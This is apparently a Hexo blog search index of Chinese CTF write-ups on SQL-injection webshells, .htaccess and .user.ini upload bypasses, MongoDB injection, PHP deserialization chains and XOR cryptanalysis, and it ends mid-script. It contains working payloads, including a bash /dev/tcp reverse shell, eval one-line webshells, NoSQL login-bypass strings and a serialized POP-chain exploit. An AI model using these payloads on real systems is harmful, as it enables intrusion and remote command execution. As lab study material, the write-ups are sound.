<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[博客初建]]></title>
    <url>%2F2020%2F07%2F19%2F%E9%BB%91%E7%99%BD%E7%9B%92%2Fhello-world%2F</url>
    <content type="text"><![CDATA[从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。 博客更新生成静态页面 1hexo generate 预览博客效果 Localhost:4000 1hexo server 同步到Github 1hexo deploy]]></content>
  </entry>
  <entry>
    <title><![CDATA[黑白盒]]></title>
    <url>%2F2020%2F07%2F19%2F%E9%BB%91%E7%99%BD%E7%9B%92%2F</url>
    <content type="text"><![CDATA[黑白盒复现(补招新题)招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。 首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。 文件上传漏洞分类1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行； 2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似); 3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。 4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。在大多数情况下，文件上传漏洞一般都是指“上传的Web脚本被服务器解析从而获取网站shell权限”，也就是webshell，要完成上传漏洞攻击需要满足以下几个条件: 1、上传的文件能够被Web容器解释执行，所以文件上传后所在的目录需要解析器可以执行目录下的文件，也就是说文件目录必须在web容器覆盖路径内才行。 2、用户可以直接通过浏览器进行访问这个shell文件，如果web容器不能解析这个文件，那么也不能算是漏洞。 3、最后，上传的shell文件如果被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。(来源：看雪) Getshell在图片上传上我们看到上传图片的地址已知，访问地址可以看到我们上传上去的图片，所以我们可以利用SQL写入一句话getshell，再反弹shell从服务器中拿到flag。 二次注入网站对我们输入的一些关键字符进行了转义，但在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了该数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。 在注册用户名时我们发现当我们的用户名为 1’ 时 登陆后显示的是 1\’ 所以网页对’进行了转义，但当我们在查看用户信息时我们的user_name显示为 1’ 所以说明我们的用户名已经被存储在数据库之中，并且从数据库中提取出来不会存在转义，这就造成了一个二次注入。 Into outfile导出数据到pc的指定目录下。在一开始的图片文件上传的时候我们看到存在/var/www/html/favicon/xxx可以读取和查看文件，所以我们将一句话写入这个地方/var/www/html/一般为网站的根目录 注册&lt;?php $_GET[x];?&gt;&lt;?php $_GET[x];?&gt; PHP中反引号 的作用是把反引号中的内容当做Shell命令执行，我们可以在新创建的的网页上传入变量x值来执行我们想要目标主机执行的命令，注册该用户可以将&lt;?php $_GET[x];?&gt;写入数据库 注册&lt;?php $_GET[x];?&gt;’into outfile’/var/www/html/favicon/4.php将&lt;?php $_GET[x];?&gt;从数据库中提取出来并导出到favicon/4.php此时在4.php中我们就可以通过变量x来上传我们想让目标主机执行的shell命令了 bash -c “bash -i &gt;&amp; /dev/tcp//9999 0&lt;&amp;1 2&gt;&amp;1”首先，bash -c 就是运行shell脚本 bash -i是打开一个交互的bash，/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。要想了解“&gt;&amp;”、“0&gt;&amp;1”和2&gt;&amp;1，首先我们要先了解一下Linux文件描述符和重定向。 linux shell下常用的文件描述符是： 标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； 标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； 标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。 &amp;可以理解为c语言中的取地址符（n&lt;&amp;word 是把word复制给n，n&gt;&amp;word是把word复制给n。）2&gt;&amp;1是将标准错误输出合并到标准输出中，&amp;&gt;是将标准错误输出定向到标准输出中。也就是输出标准输出的同时也会输出标准错误输出。这句话的意思创建一个可交互的bash和一个到xxx.xxx.xxx.xxx的TCP链接，然后将bash的输入输出错误都重定向到在xxx.xxx.xxx.xxx监听的进程。简单来说就是A主机可以通过执行B主机上的命令并且把返回值都返回到A上。 这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)之后再服务器开启监听 nc -lvnp 9999 现在我们之前所传的一句话就派上了用场，在4.php的地址后构造?x=bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp//9999 0%3C%26%202%3E%261%22 就可以让目标主机执行这个命令 原理A主机开启9999端口的tcp服务B主机连接到A主机的9999的tcp服务A主机通过tcp服务把命令发到B主机B主机读取命令并且在bash中执行B主机把执行结果发给A主机 拿到shell之后就可以 cd / 进入主目录，主目录中存在包含flag的文件cat读取文件就可以拿到flag]]></content>
      <categories>
        <category>Web复现</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同源策略]]></title>
    <url>%2F2020%2F07%2F19%2F%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[同源策略最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略 首先是源的概念：• 源（origin）就是协议、域名和端口号。 以下是相对于 http://www.a.com/test/index.html 的同源检测• http://www.a.com/dir/page.html —-成功• http://www.child.a.com/test/index.html —-失败，域名不同• https://www.a.com/test/index.html —-失败，协议不同所以所谓同源就是协议、域名和端口号均相同。 什么是同源策略： 同源策略是一种约定，限制了来自不同源的“document”或脚本，对当前“doucument”的读取或者设置某些属性。 举个例子：如果没有同源策略，可能a.com里的一段JS脚本在b.com未加载此脚本时也可以修改b.com的内容。 同源策略限制了不同源的对象之间的互相干扰，也就是说当JS被浏览器认为来自不同源时，请求被拒绝。注意，对于当前页面来说，页面里存放JS文件的域不重要，重要的是加载JS界面的域是什么。 什么是跨域浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域 不受同源策略限制的：1、页面中的链接，重定向以及表单提交是不会受到同源策略限制的。 2、跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的 &lt; script src=”…” &gt; &lt; /script &gt;，&lt; img &gt;，&lt; link &gt;，&lt; iframe &gt;等。 所以我们就可以利用&lt; script &gt;标签来绕过了同源策略，来找到跨域漏洞。 第一次写博客，内容不是很全，也会有许多错误的地方，了解的知识很有限，一些名词和漏洞名称从来没有接触过，希望大家可以指出错误。]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件解析漏洞]]></title>
    <url>%2F2019%2F10%2F08%2Fhtaccess%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[htaccesshtaccess文件(分布式配置文件，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。 设置初始页面 错误重定向&amp;重定向 设置文件访问权限 1234&lt;Files 1.php&gt;order allow,denydeny from all&lt;/Files&gt; 开启htaccess 1234567apache 配置文件里httpd.conf文件找到 AllowOverride None改为AllowOverride All LoadModule rewrite_module modules/mod_rewrite.so 把这个前面的“#”号去掉 然后重启apache。 针对一些黑名单的限制，php文件无法上传或者无法被解析， 1234AppType application/x-httpd-php .jpg将所有jpg文件解析未php文件再结合一句话图片马就可以拿到shell X-NUCA ezphp12345678910111213141516171819202122232425262728293031323334&lt;?php $files = scandir(&apos;./&apos;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; include_once(&quot;fl3g.php&quot;); if(!isset($_GET[&apos;content&apos;]) || !isset($_GET[&apos;filename&apos;])) &#123; highlight_file(__FILE__); die(); &#125; $content = $_GET[&apos;content&apos;]; if(stristr($content,&apos;on&apos;) || stristr($content,&apos;html&apos;) || stristr($content,&apos;type&apos;) || stristr($content,&apos;flag&apos;) || stristr($content,&apos;upload&apos;) || stristr($content,&apos;file&apos;)) &#123; echo &quot;Hacker&quot;; die(); &#125; $filename = $_GET[&apos;filename&apos;]; if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) &#123; echo &quot;Hacker&quot;; die(); &#125; $files = scandir(&apos;./&apos;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; file_put_contents($filename, $content . &quot;\nJust one chance&quot;); ?&gt; 文件只能传一个 开始一直500，差点放弃htaccess，后来发现可能是后面拼接的那个字符串不符合htaccess文件的编写规则， 使用反斜杠换行符将其和注释拼接在一起 最后面加一行 1#fuck\ 同样利用\绕过那些敏感字符， 123&lt;FilesMatch “a”&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;加上反斜杠拼接就可以正常写入htaccess文件，并将我们传入的a文件解析为php .user.ini除了主php.ini之外，PHP还会在每个目录下扫描INI 文件，从被执行的PHP文件所在目录开始一直上升到 web 根目录 123auto_prepend_file=12.jpg所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。 SUCTF CheckIn先上传一个图片文件，留下文件头 加上一句话木马 1&lt;script language=&quot;php&quot;&gt;eval($_GET[h]);&lt;/script&gt; 绕过了&lt;?的限制 后上传.user.ini文件 1auto_prepend_file=12.jpg 包含该文件 123之后phpinfo测试可行/uploads/f4e7685fe689f675c85caeefaedcf40c/index.php?h=phpinfo(); 菜刀连接拿到flag]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb注入]]></title>
    <url>%2F2019%2F08%2F13%2Fmongodb%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[mongodb注入cybircsctf的一道nopesql，开始没想到是mongodb注入，某天惊奇地发现题目还没关，复现一下，学习一下mongodb注入 mongodb参考链接：http://www.vuln.cn/63541.用mongo类中相应的方法执行增查减改，传递进入的参数是一个数组： &lt;?php $mongo = new mongoclient(); $db = $mongo-&gt;myinfo; //选择数据库 $coll = $db-&gt;test; //选择集合 $coll-&gt;save(); //增 $coll-&gt;find(); //查 $coll-&gt;remove(); //减 $coll-&gt;update(); //改 2.用execute方法执行字符串 传递进入的参数是query的值： #!php &lt;?php $mongo = new mongoclient(); $db = $mongo-&gt;myinfo; //选择数据库 $query = &quot;db.table.save({&apos;newsid&apos;:1})&quot;; //增 $query = &quot;db.table.find({&apos;newsid&apos;:1})&quot;; //查 $query = &quot;db.table.remove({&apos;newsid&apos;:1})&quot;; //减 $query = &quot;db.table.update({&apos;newsid&apos;:1},{&apos;newsid&apos;,2})&quot;; 改 $result = $db-&gt;execute($query); shell和phpphp语句 $db-&gt;find([&quot;num&quot;=&gt;[&apos;$gt&apos;=&gt;2],&quot;name&quot;=&gt;&quot;test_3&quot;]) shell语句 b.tr1ple.find({&apos;num&apos;:{&quot;$gt&quot;:2},&apos;name&apos;:&apos;test_3&apos;}) 相当于sql语句 select * from tr1ple where num&gt;2 and name=&quot;test_3&quot; 注入方式mongodb条件操作符 操作符 对应 $lt &lt; $lte &lt;= $ne != $gt &gt; $gte &gt;= 数组注入#!php &lt;?php $mongo = new mongoclient(); $db = $mongo-&gt;myinfo; //选择数据库 $coll = $db-&gt;test; //选择集合 $username = $_GET[&apos;username&apos;]; $password = $_GET[&apos;password&apos;]; $data = array( &apos;username&apos;=&gt;$username, &apos;password&apos;=&gt;$password ); $data = $coll-&gt;find($data); $count = $data-&gt;count(); if ($count&gt;0) { foreach ($data as $user) { echo &apos;username:&apos;.$user[&apos;username&apos;].&quot;&lt;/br&gt;&quot;; echo &apos;password:&apos;.$user[&apos;password&apos;].&quot;&lt;/br&gt;&quot;; } } else{ echo &apos;未找到&apos;; } ?&gt; 此时我们传递参数 ?username=test&amp;password=test 相当于执行了查询语句 db-&gt;test-&gt;find({username:’test’,password:’test’}); 并且输出查询的内容而我们要注入的语句是 ?username[$ne]=test&amp;password[$ne]=test 相当于执行了 db.test.find({username:{‘$ne’:’test’},password:{‘$ne’:’test’}}); 相当于对username!=test，password!=test的查询此处是字符的比较，比较的是字符的ascii值 对应sql语句： select * from test where username!=’test’ and password!=’test’; 返回所有username!=test，password!=test的结果 如果读取后并没有回显，我们可以采取$regex操作符来一位一位获取数据。 传递参数为 username[$regex]=^a 对应的操作为 db.test.find({username:{‘$regex’:’^a’},password:{‘$regex’:’^a’}}) 从第一位开始，^a,^a1,^a13 …… 拼接字符串时的注入#!php &lt;?php $username = $_GET[&apos;username&apos;]; $password = $_GET[&apos;password&apos;]; $query = &quot;var data = db.test.findOne({username:&apos;$username&apos;,password:&apos;$password&apos;});return data;&quot;; //$query = &quot;return db.test.findOne();&quot;; //echo $query; $mongo = new mongoclient(); $db = $mongo-&gt;myinfo; $data = $db-&gt;execute($query); if ($data[&apos;ok&apos;] == 1) { if ($data[&apos;retval&apos;]!=NULL) { echo &apos;username:&apos;.$data[&apos;retval&apos;][&apos;username&apos;].&quot;&lt;/br&gt;&quot;; echo &apos;password:&apos;.$data[&apos;retval&apos;][&apos;password&apos;].&quot;&lt;/br&gt;&quot;; }else{ echo &apos;未找到&apos;; } }else{ echo $data[&apos;errmsg&apos;]; } ?&gt; 和sql中堆叠注入有点像，将前面正常的语句闭合，加,后面的构造的语句依旧可以执行 题目git源码泄露，大佬wp中学到的姿势，虽然它404了，但是我们可以看到.git后面加了/，虚假的404，可以用githack得到源码。 GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。 渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。 工作原理 解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 ) 去.git/objects/ 文件夹下下载对应的文件 zlib解压文件，按原始的目录结构写入源代码 命令： python git.py http://173.199.118.226/.git/ 得到index.php源码： 登陆部分&lt;?php require_once __DIR__ . &quot;/vendor/autoload.php&quot;; function auth($username, $password) { $collection = (new MongoDB\Client(&apos;mongodb://localhost:27017/&apos;))-&gt;test-&gt;users; $raw_query = &apos;{&quot;username&quot;: &quot;&apos;.$username.&apos;&quot;, &quot;password&quot;: &quot;&apos;.$password.&apos;&quot;}&apos;; $document = $collection-&gt;findOne(json_decode($raw_query)); if (isset($document) &amp;&amp; isset($document-&gt;password)) { return true; } return false; } $user = false; if (isset($_COOKIE[&apos;username&apos;]) &amp;&amp; isset($_COOKIE[&apos;password&apos;])) { $user = auth($_COOKIE[&apos;username&apos;], $_COOKIE[&apos;password&apos;]); } if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) { $user = auth($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]); if ($user) { setcookie(&apos;username&apos;, $_POST[&apos;username&apos;]); setcookie(&apos;password&apos;, $_POST[&apos;password&apos;]); } } ?&gt; 我们观察到$raw_query处可以进行字符串的拼接： 构造username:admin password=&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;a&quot;},&quot;username&quot;:&quot;admin 或者password=&quot;,&quot;password&quot;:{&quot;$gt&quot;:&quot;a&quot;},&quot;username&quot;:&quot;admin 将前面语句闭合，并构造了新的查询，用户名为admin，password不为a，就可以返回true从而进行登陆 查询部分&lt;?php if ($user == true): ?&gt; Welcome! &lt;div&gt; Group most common news by &lt;a href=&quot;?filter=$category&quot;&gt;category&lt;/a&gt; | &lt;a href=&quot;?filter=$public&quot;&gt;publicity&lt;/a&gt;&lt;br&gt; &lt;/div&gt; &lt;?php $filter = $_GET[&apos;filter&apos;]; $collection = (new MongoDB\Client(&apos;mongodb://localhost:27017/&apos;))-&gt;test-&gt;news; $pipeline = [ [&apos;$group&apos; =&gt; [&apos;_id&apos; =&gt; &apos;$category&apos;, &apos;count&apos; =&gt; [&apos;$sum&apos; =&gt; 1]]], [&apos;$sort&apos; =&gt; [&apos;count&apos; =&gt; -1]], [&apos;$limit&apos; =&gt; 5], ]; $filters = [ [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; $filter]] ]; $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline)); ?&gt; &lt;?php if (isset($filter)): ?&gt; &lt;?php foreach ($cursor as $category) { printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&apos;_id&apos;], $category[&apos;count&apos;]); } ?&gt; &lt;?php endif; ?&gt; &lt;?php else: ?&gt; &lt;?php if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])): ?&gt; Invalid username or password &lt;?php endif; ?&gt; &lt;form action=&apos;/&apos; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;h2&gt;News&lt;/h2&gt; &lt;?php $collection = (new MongoDB\Client(&apos;mongodb://localhost:27017/&apos;))-&gt;test-&gt;news; $cursor = $collection-&gt;find([&apos;public&apos; =&gt; 1]); foreach ($cursor as $news) { printf(&quot;%s&lt;br&gt;&quot;, $news[&apos;title&apos;]); } ?&gt; &lt;?php endif; ?&gt; MongoDB中聚合(aggregate)主要用于处理数据(诸如统计平均值,求和等)，并返回计算后的数据结果,有点类似sql语句中的count(*)。MongoDB的管道将MongoDB文档在一个管道处理完毕后将结果传递给下一个管道处理。管道操作是可以重复的，以下是几个管道相关操作中的表达式： $project:修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档，可以把它当作指定域，因为默认find()函数将范围集合中所有的域的数据(可以把它当作SQL里面的字段来理解)。 $limit:用来限制MongoDB聚合管道返回的文档数。 $group:将集合中的文档分组，可用于统计结果。 $sort:将输入文档排序后输出。(使用1和-1来指定排序的方式,其中1为升序排列,而-1是用于降序排列) 首先我们来理解一下1 $pipeline = [ [&apos;$group&apos; =&gt; [&apos;_id&apos; =&gt; &apos;$category&apos;, &apos;count&apos; =&gt; [&apos;$sum&apos; =&gt; 1]]], [&apos;$sort&apos; =&gt; [&apos;count&apos; =&gt; -1]],//降序输出 [&apos;$limit&apos; =&gt; 5],//限制返回文档数为5 ]; &apos;_id&apos; =&gt; &apos;$category&apos;前面的情况出现一次，$sum值+1(如果是=&gt;2的话+2)，并赋值给count { $group: { _id：&quot;$分组字段名&quot;, 显示字段名: { 聚集函数: &quot;$字段名&quot;}，[显示字段名2: { 聚集函数: &quot;$字段名&quot;}, ...] } } 2 $filters = [ [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; $filter]] ]; 对category进行了重命名 3 $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline)); array_merge() 函数把一个或多个数组合并为一个数组。 4 foreach ($cursor as $category) { printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&apos;_id&apos;], $category[&apos;count&apos;]);} 将cursor中所有组遍历赋值给category，打印其中_id和count 我们传递filter参数，并把其值作为分组字段，返回各分组信息，当filter=$category ,我们可以看到他输出的结果是 Welcome! Group most common news by category | publicity politics has 9 news flags has 9 news finance has 5 news comedy has 5 news 测试发现category还可以是$_id，$text，$title，但是limit的限制没法打印text中的flag 数组盲注需要传递两个参数，而且前后$内容要一致 ?filter[$gt][0]=$text&amp;filter[$gt][1]=c 相当于 [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; [$gt =&gt; [&quot;text&quot;, &quot;c&quot;]]]] 后面的c为text分组内的内容，所以前后参数都要为$gt payload是 ?filter[$gt][0]=$text&amp;filter[$gt][1]=cy 显示 ?filter[$gt][0]=$text&amp;filter[$gt][1]=cz 则显示 就可以写脚本得到flag 得到flag后也可以对此进行验证 ?filter[$ne][0]=$text&amp;filter[$ne][1]=cybrics{7|-|15 15 4 7E&gt;&lt;7 |=|_49}]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php反序列化]]></title>
    <url>%2F2019%2F08%2F13%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[php反序列化漏洞的整理PHP序列化：php为了方便进行数据的传输，允许把复杂的数据对象，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。 序列化格式解释a - array 数组b - boolean 布尔值d - double double类型i - integer 整数o - common object 公共对象r - reference 引用s - string 字符串C - custom object 自定义对象O - class 类N - null 空R - pointer reference 指针U - unicode string Unicode字符串 举例介绍： O:3:“foo”:2:{s:4:”file”;s:9:”shell.php”;s:4:”data”;s:5:”aaaaa”;} O:3: 参数类型为对象 “foo”:2: 参数名为foo，有两个值 S:4:”file”;s:9:”shell.php”; s:参数类型为字符串(数字为i)，长度为4，值为file。长度为9的字符串shell.php s:4:”data”;s:5:”aaaaa”;} 长度为4的字符串data，长度为5的字符串aaaaa 数组序列化&lt;?php $data=[&apos;PHP&apos;,&apos;HTML&apos;,&apos;Java&apos;,&apos;Python&apos;]; echo serialize($data); 结果： a:4:{i:0;s:3:&quot;PHP&quot;;i:1;s:4:&quot;HTML&quot;;i:2;s:4:&quot;Java&quot;;i:3;s:6:&quot;Python&quot;;} 指针序列化之前国赛just soso中有一步绕过就利用了指针序列化 if($this-&gt;token === $this-&gt;token_flag) 本来以为是伪随机数种子，后来发现只需在序列化中让$F-&gt;token=&amp;$F-&gt;token_flag; &amp;表示取变量值，将两个变量的值在序列化反序列化过程中关联起来，就可以相等 漏洞产生原因php之所以会存在反序列化的漏洞原因是一些魔法函数 __construct():当一个类被创建时自动调用 __destruct():当一个类被销毁时自动调用 __invoke():当把一个类当作函数使用时自动调用 __tostring():当把一个类当作字符串使用时自动调用 __wakeup():当调用unserialize()函数时自动调用 __sleep():当调用serialize()函数时自动调用 __call():当要调用的方法不存在或权限不足时自动调用 如果服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了同样在之前国赛的just soso中有一个wakeup()的绕过， wakeup()触发于unserilize()调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得wakeup函数失效。 我们可以利用这种自动执行某些函数或方法的特性，执行我们相要的操作。 夏令营一道题目 &lt;?php include &apos;flag.php&apos;; class Deep{ public $m1; public $m2; public function __destruct(){ $this-&gt;m1-&gt;boy(); } } class Dark{ public $m1; public $m2; public function boy(){ $this-&gt;m1-&gt;next_door(); } } class Fantasy{ public $m1; public $m2; public function __call($next_door,$arr){ $s = $this-&gt;m1; $s(); } } class Happy{ public $m1; public $m2; public function __invoke(){ $this-&gt;m2=&quot;cnss&quot;.$this-&gt;m1; } } class New_year{ public $s1; public $s2; public function __toString(){ $this-&gt;s1-&gt;get_flag(); return &quot;1&quot;; } } class GetFlag{ public function get_flag(){ global $flag; echo $flag; } } $a = $_GET[&apos;payload&apos;]; unserialize($a); show_source(__FILE__); ?&gt; 反序列化脚本： &lt;?php class Deep{ public $m1; public $m2; public function __construct(){ $this-&gt;m1= new Dark();#可以直接赋值位Fantasy() } public function __destruct(){ $this-&gt;m1-&gt;boy(); } } class Dark{ public $m1; public $m2; public function __construct(){ $this-&gt;m1= new Fantasy(); } public function boy(){ $this-&gt;m1-&gt;next_door(); } } class Fantasy{ public $m1; public $m2; public function __construct(){#无法调用next_door方法时，就调用__call方法， $this-&gt;m1-&gt;next_door();所以此处将m1赋值为Happy()类，无法调用next_door，自动调用call方法 $this-&gt;m1= new Happy(); } public function __call($next_door,$arr){ $s = $this-&gt;m1; $s(); } } class Happy{ public $m1; public $m2; public function __construct(){ $this-&gt;m1= new New_year();//由于__toString()方法，所以要将New_year作为字符串来使用 } public function __invoke(){ $this-&gt;m2=&quot;cnss&quot;.$this-&gt;m1;//字符串拼接来使用__toString()中的get_flag() } } class New_year{ public $s1; public $s2; public function __construct(){ $this-&gt;s1= new GetFlag();//get_flag()在GetFlag类中，所以要先将s1赋值为GetFlag()才能使用get_flag() } public function __toString(){ $this-&gt;s1-&gt;get_flag(); return &quot;1&quot;; } } class GetFlag{ public function get_flag(){ global $flag; echo $flag; } } $a = new Deep; echo urlencode(serialize($a)); payload： O%3A4%3A%22Deep%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22Dark%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A7%3A%22Fantasy%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A8%3A%22New_year%22%3A2%3A%7Bs%3A2%3A%22s1%22%3BO%3A7%3A%22GetFlag%22%3A0%3A%7B%7Ds%3A2%3A%22s2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7D]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xor异或解密]]></title>
    <url>%2F2019%2F08%2F05%2FXor%E5%BC%82%E6%88%96%E8%A7%A3%E5%AF%86%2F</url>
    <content type="text"><![CDATA[XorzzDe1ctf密码学一道题，当时不会做，orz….,题目 from itertools import * from data import flag,plain key=flag.strip(&quot;de1ctf{&quot;).strip(&quot;}&quot;) assert(len(key)&lt;38) salt=&quot;WeAreDe1taTeam&quot; ki=cycle(key) si=cycle(salt) cipher = &apos;&apos;.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[2:].zfill(2) for p in plain]) print cipher output: 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c 题目中 ord(p) ^ ord(next(ki)) ^ ord(next(si)) 三个异或之后再转换为16进制，[2:].zfill(2)去掉了头两位0x，并在少于两位时左补0，输出有1200位，也就是一次异或得到两位数字由此可以得出ord(p) ^ ord(next(ki))的一串值，然后plain是个600位的字符串，key循环和plain中的每一位字符异或，然后就不会了orz…. 先是python2按位异或，python中字符串*一个数字n相当于将字符串重复了n遍，(密文的长度/salt长度)+1是salt字符串重复的次数，再 [:len(h)]取与密文相同的位数，然后strxor按位异或，结果base64加密后输出 # coding=&lt;encoding name&gt; # vim: set fileencoding=utf-8 : import itertools import base64 from Crypto.Util.strxor import strxor a=&apos;WeAreDe1taTeam&apos; h=&apos;49380d773440222d1b421b3060.....&apos; h=h.decode(&apos;hex&apos;) m=(a*(len(h)/len(a)+1))[:len(h)] o=strxor(h,m).encode(&apos;base64&apos;) print(o) 一次流密码的解密 汉明距离猜解密钥长度汉明距离其实是在二进制层面观测两个等长字符串的比特位差异，也就是1111和1000的汉名距离为3，两个二进制字符串按位异或有多少个1，汉明距离就为多少 那么汉明距离和密文长度又有什么关系呢？两个以ascii编码的英文字符的汉明距离是2-3之间，也就是说正常英文字母的平均汉明距离为2-3（每比特），任意字符（非纯字母）的两两汉明距离平均为4。当我们使用了正确的密钥长度后，对密文中两两字母进行计算汉明距离，汉明距离的值应该是趋于最小 根据猜解的密钥长度解得密钥利用明文中空格在使用异或加密的形式下，使用相同密钥加密的明文和密文间存在这两个规律：1.密文和密文异或等于明文和明文异或。 也就是说将明文和密文按照密钥长度分组后，相对应得两个密文字符和两个明文字符异或是相等的2.空格和所有小写字母异或结果是相应的大写字母，空格和所有大写字母异或是相应的小写字母。 这样当两个密文按照字节异或后的结果处于字母表的ascii值之间，我们就可以有很大的概率认为异或的明文字符之一是空格 也就是 密文第一位^密文第31位=字母表ascii=明文第1(31)位^空格 按密钥长度将密文进行分组，取其中一个分组，将里面的字符两两异或，如果某一密文字符和其他密文字符异或的结果都处于字母表区间，那么我们将推断其对应位置的明文为空格，密文字节与空格异或就得到了对应位置的密钥密钥 字频攻击最后附上脚本，造轮子是不可能自己会造的(枯了本文非原创，原文参考链接：https://www.anquanke.com/post/id/161171 没想明白为什么^无法进行str^str的异或，但是在脚本中就可以qaq import base64 import string def bxor(a, b): # 计算汉明距离，两个二进制字符串按位异或有多少个1就有多少个不同的字符 if len(a) 